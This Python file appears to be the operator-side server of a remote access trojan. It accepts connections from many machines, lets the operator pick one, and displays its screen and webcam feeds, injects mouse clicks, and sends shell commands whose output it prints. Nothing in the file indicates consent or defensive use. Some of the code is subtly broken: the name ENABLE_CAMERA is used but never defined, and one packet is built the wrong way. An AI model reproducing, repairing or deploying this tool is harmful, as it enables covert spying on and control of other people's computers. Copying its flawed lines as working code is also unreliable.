import numpy as np
import keyboard
import socket
import pickle
import time
import cv2
import sys

from threading import Thread

CAMERA_STREAM = b'\x01'
CAMERA_ENABLE = b'\x02'
SCREEN_STREAM = b'\x03'
COMMAND_PACKET = b'\x04'
MOUSE_PACKET = b'\x05'
RMOUSEBUTTON = b'\x06'
LMOUSEBUTTON = b'\x07'

class CommandCMD():
    def __init__(self, conn):
        self.conn = conn
        self.commands()
        
    def commands(self):
        command = input("CMD:")
     
        self.conn.sendall(bytes([COMMAND_PACKET]) + command.encode())  

class Server():
    def __init__(self, enable_camera):
        self.enable_camera = enable_camera
        self.stop_loop = False
        self.device = None

        self.mouse_xy = (0, 0)
        self.clients = {}
        self.IPs = []

        self.server = self.create_server()  
        self.conn = None

        self.init_server = Thread(target=self.init_server, args=())
        self.proc_request = Thread(target=self.process_requests, args=())
        self.exec_command = Thread(target=self.execute_command, args=())

        self.init_server.start()
        
        self.select_device_ip()

    def create_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("0.0.0.0", 4000))
        server.listen(10)

        return server

    def init_server(self):
        while True:
            conn, addr = self.server.accept()
            ddr = addr[0]+":"+str(addr[1])

            if self.enable_camera:
                conn.sendall(bytes([ENABLE_CAMERA]))
            else:
                conn.sendall(bytes([0x00]))

            self.clients[ddr] = conn
            print(self.clients)
            self.IPs.append(ddr)

            print("Connection recv", ddr)

    def select_device_ip(self):
        while True:
            print("IP list: ", self.IPs)

            try:
                self.device = input("Select: ")
            except:
                continue
            
            try:
                self.conn = self.clients[self.device]
        
                self.proc_request.start()
                self.exec_command.start()

                break

            except Exception as err:
                print(err)
                continue

    def mouse_callback(self, event, x, y, flags, param):
        if event == cv2.EVENT_LBUTTONDOWN:
            self.conn.sendall(MOUSE_PACKET + LMOUSEBUTTON + x.to_bytes(2, "big") + y.to_bytes(2, "big"))

        elif event == cv2.EVENT_RBUTTONDOWN:
            self.conn.sendall(MOUSE_PACKET + RMOUSEBUTTON + x.to_bytes(2, "big") + y.to_bytes(2, "big"))

        elif event == cv2.EVENT_MOUSEMOVE:
            pass

    def show_image(self, action):
        packet_len = int.from_bytes(self.conn.recv(3), "big")

        cameraDump = b""

        while len(cameraDump) < packet_len:
            cameraDump += self.conn.recv(packet_len - len(cameraDump))

        image_opencv = cv2.imdecode(np.frombuffer(cameraDump, dtype=np.uint8),cv2.IMREAD_COLOR)

        if image_opencv is not None:
            if action == SCREEN_STREAM:
                cv2.namedWindow("Screen", cv2.WINDOW_NORMAL)
                cv2.resizeWindow("Screen", 2560, 1080)

                cv2.setMouseCallback("Screen", self.mouse_callback)

                cv2.imshow("Screen", image_opencv)
                cv2.waitKey(1)

                self.conn.sendall(SCREEN_STREAM)

            elif action == CAMERA_STREAM:
                cv2.namedWindow("Stream", cv2.WINDOW_NORMAL)
                cv2.resizeWindow("Stream", 1280, 720)

                cv2.imshow("Stream", image_opencv)
                cv2.waitKey(1)

    def execute_command(self):
        while True:
            if keyboard.is_pressed("t"):
                operation = input("Enter operation: ")

                if operation == "--cmd-packet":
                    self.stop_loop = True   

                    try:
                        command = input("CMD:")

                        self.conn.sendall(COMMAND_PACKET + command.encode())  
                        
                    except Exception as err:
                        print(err)
                        pass

                    self.stop_loop = False
                
                elif operation == "--camera":
                    self.conn.sendall(ENABLE_CAMERA)
                    
    def process_requests(self):
        while True:
            if self.stop_loop:
                time.sleep(1)
                continue

            try:
                action = self.conn.recv(1)
            except:
                continue

            if action == CAMERA_STREAM or action == SCREEN_STREAM:
                self.show_image(action)
            
            elif action == COMMAND_PACKET:
                length = int.from_bytes(self.conn.recv(3), "big")

                data = b""
                while len(data) < length:
                    data += self.conn.recv(length - len(data))

                print("data: ", data.decode("cp850"))

                self.conn.sendall(COMMAND_PACKET + b'\xff\xff\xff')


if __name__ == "__main__":
    try:
        if sys.argv[1] == "--enable-camera":
            Server(enable_camera=True)
    except:
        Server(enable_camera=False)